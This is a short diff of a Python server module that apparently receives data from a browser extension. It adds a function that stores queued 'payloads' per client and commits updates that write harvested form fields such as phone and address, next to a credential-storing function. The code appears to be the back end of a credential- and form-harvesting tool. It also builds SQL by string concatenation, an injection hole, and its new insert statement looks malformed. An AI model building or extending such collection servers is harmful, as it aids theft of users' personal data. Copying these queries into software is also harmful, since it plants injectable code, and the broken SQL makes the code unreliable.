@@ -76,6 +76,15 @@ def store_credential(data, clientid):
     return 0
 
 
+def store_payload(clientid):
+    payload = pending_payloads.pop(clientid, None)
+    if payload == None:
+        return
+    cur = getCursor()
+    cur.execute("insert into PendingPayloads values (%s, %s) on duplicate key update Payload=(%s) where ClientID=(%s)", (clientid, payload, payload, clientid))
+    conn.commit()
+
+
 """
 param data: form from extension->server payload in the form of a dictionary. key-value pairs are
     "url": url and remotedef: value
@@ -100,7 +109,7 @@ def store_form_data(data, clientid):
         print(val)
         execStr = "UPDATE Client SET " + test[1][1] + " = '" + val + "' WHERE Id = " + str(clientid)
         cur.execute(execStr)
-       # cur.commit()
+        conn.commit()
 """ cur = getCursor()
 phoneNumber = data["forms"]["phone"]
 address = data["forms"]["Address"]
